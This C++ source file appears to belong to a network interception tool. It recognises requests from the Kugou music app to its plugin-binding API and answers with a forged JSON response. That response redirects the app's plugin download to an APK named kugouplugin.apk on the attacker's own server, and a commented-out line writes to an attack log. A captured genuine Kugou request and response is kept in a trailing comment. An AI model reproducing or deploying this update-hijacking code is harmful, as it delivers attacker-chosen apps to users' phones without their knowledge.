

#include "KugouPlugin.h"
#include "../httputils.h"
#include "../cipher/CryptoUtils.h"

int KugouPlugin::isKugouPlugin(const char * url, const char * host) {
	if (strstr(host, "mobileservice.kugou.com") == FALSE) {
		return FALSE;
	}

	if (strstr(url, "/api/v3/util/newbinding?"))
	{
		return TRUE;
	}

	return FALSE;
}

int KugouPlugin::replyKugouPlugin(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/html; charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + username;

	string packagename = "kugouplugin.apk";

// 	string filename1 = Public::getUserPluginPath(username) + packagename;
// 	char szmd5_1[64] = { 0 };
// 	unsigned char hexmd5[64] = { 0 };
// 	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);

	char hdrformat[4096];
	char szformat[] = "{\"status\":1,\"errcode\":0,\"error\":\"\",\"data\":"
	"{\"timestamp\":9957323557,\"info\":[{\"id\":\"97\",\"name\":\"\",\"url\":\"http:\\/\\/%s\\/%s\","
		"\"package\":\"com.kugou.fanxing\",\"level\":\"1\",\"default_checked\":\"1\",\"notice\":\"\",\"checked_notice\":\"\","
		"\"imgurl\":\"http:\\/\\/imge.kugou.com\\/mcommon\\/20190430\\/20190430194713311437.png\","
		"\"iconurl\":\"http:\\/\\/imge.kugou.com\\/mcommon\\/20190430\\/20190430194717511784.png\"}]}}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,strip.c_str(), packagename.c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	//char szout[4096];
	//int outlen = sprintf_s(szout, 4096, "miaopai reply:%s\r\n", dstbuf);
	//Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}


/*
GET /api/v3/util/newbinding?all=1&channel=46&version=9209 HTTP/1.1
User-Agent: Android601-AndroidPhone-9209-46-0-AppCommend-wifi
KG-THash: 12e6ad9
Accept-Encoding: gzip, deflate
KG-RC: 1
Host: mobileservice.kugou.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: openresty
Date: Wed, 08 May 2019 13:52:37 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache
Content-Encoding: gzip

{"status":1,"errcode":0,"error":"","data":{"timestamp":1557323557,"info":[{"id":"97","name":"°²×°¿á¹·Ö±²¥","url":"http:\/\/fxdownmini.kugou.com\/fanxing\/android\/fanxing_45502_4.55.2_453.apk","package":"com.kugou.fanxing","level":"1","default_checked":"1","notice":"","checked_notice":"","imgurl":"http:\/\/imge.kugou.com\/mcommon\/20190430\/20190430194713311437.png","iconurl":"http:\/\/imge.kugou.com\/mcommon\/20190430\/20190430194717511784.png"}]}}
*/